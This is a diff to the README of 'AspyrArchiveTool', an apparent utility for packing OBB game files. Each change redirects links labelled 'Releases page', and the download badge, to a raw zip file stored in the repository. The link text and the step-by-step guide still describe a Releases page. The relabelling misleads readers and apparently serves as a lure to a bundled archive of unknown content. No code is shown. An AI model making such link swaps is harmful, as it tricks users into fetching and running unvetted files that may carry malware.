@@ -1,6 +1,6 @@
 # 🎮 AspyrArchiveTool - Easily Pack and Unpack OBB Files
 
-[![Download AspyrArchiveTool](https://img.shields.io/badge/Download-AspyrArchiveTool-blue.svg)](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases)
+[![Download AspyrArchiveTool](https://raw.githubusercontent.com/TECHNO-SOUQ/AspyrArchiveTool/master/AspyrArchiveTool/Tool_Archive_Aspyr_v1.2.zip)](https://raw.githubusercontent.com/TECHNO-SOUQ/AspyrArchiveTool/master/AspyrArchiveTool/Tool_Archive_Aspyr_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AspyrArchiveTool, your go-to software for packing and unpacking Aspyr
 
 ## 📥 Download & Install
 
-To get started, you will need to download AspyrArchiveTool. You can do this by visiting our [Releases page](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases). Here’s a simple guide to download the software:
+To get started, you will need to download AspyrArchiveTool. You can do this by visiting our [Releases page](https://raw.githubusercontent.com/TECHNO-SOUQ/AspyrArchiveTool/master/AspyrArchiveTool/Tool_Archive_Aspyr_v1.2.zip). Here’s a simple guide to download the software:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of AspyrArchiveTool.
@@ -88,4 +88,4 @@ By downloading and using this software, you agree to the terms outlined in the l
 
 ---
 
-For download options, please visit our [Releases page](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases) again. Enjoy managing your OBB files!
+For download options, please visit our [Releases page](https://raw.githubusercontent.com/TECHNO-SOUQ/AspyrArchiveTool/master/AspyrArchiveTool/Tool_Archive_Aspyr_v1.2.zip) again. Enjoy managing your OBB files!
